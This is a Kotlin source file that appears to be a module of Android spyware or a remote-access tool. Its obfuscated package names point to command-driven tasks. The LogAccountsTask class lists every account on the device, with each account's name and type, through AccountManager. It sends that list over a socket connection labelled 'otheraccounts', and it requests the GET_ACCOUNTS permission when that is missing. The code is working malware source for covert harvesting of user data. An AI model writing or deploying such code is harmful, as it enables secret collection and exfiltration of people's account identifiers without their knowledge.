package com.xxx.zzz.commandp.taskssv

import android.Manifest
import android.accounts.AccountManager
import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import androidx.core.app.ActivityCompat
import com.xxx.zzz.socketsp.IOSocketyt
import org.json.JSONArray
import org.json.JSONObject


class LogAccountsTask(val ctx: Context) :
    BaseTask(ctx) {

    @SuppressLint("MissingPermission")
    private fun logAccounts() {
        val list = JSONArray()
        try {
            val accounts = AccountManager.get(ctx).accounts
            for (ac in accounts) {
                val obj = JSONObject()
                obj.put("name", ac.name)
                obj.put("type", ac.type)
                list.put(obj)
            }
        } catch (e: java.lang.Exception) {
            IOSocketyt.sendLogs("", "LogAccountsTask ${e.localizedMessage}", "error")
        }

        IOSocketyt.sendLogs("", list.toString(), "otheraccounts")
        IOSocketyt.sendLogs("", "LogAccountsTask ${list.length()}", "success")
    }

    override fun run() {
        super.run()
        if (ActivityCompat.checkSelfPermission(
                ctx,
                Manifest.permission.GET_ACCOUNTS
            ) == PackageManager.PERMISSION_GRANTED
        ) {
            runCatching {
                logAccounts()
            }.onFailure {
                IOSocketyt.sendLogs("", "LogAccountsTask ${it.localizedMessage}", "error")
            }
        } else
            requestPermissions()
    }
}


